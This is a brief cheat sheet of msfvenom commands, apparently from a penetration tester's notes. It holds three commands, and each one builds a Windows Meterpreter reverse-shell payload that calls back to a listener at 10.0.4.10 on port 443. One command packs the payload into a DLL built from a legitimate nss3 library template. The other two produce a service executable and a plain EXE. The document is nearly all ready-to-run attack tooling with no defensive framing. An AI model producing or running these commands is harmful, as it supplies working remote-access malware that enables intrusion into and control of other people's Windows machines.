### MSFVENOM Payloads

# DLL Payload
msfvenom --platform windows --arch x86 --format dll --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=10.0.4.10 LPORT=443 --template nss3_legit.dll --keep > nss3.dll

# Custom Windows Service Payload
msfvenom --platform windows --arch x86 --format exe-service --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=10.0.4.10 LPORT=443 > winmalservice.exe

# Custom Generic EXE Payload
msfvenom --platform windows --arch x86 --format exe --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=10.0.4.10 LPORT=443 > winmal.exe
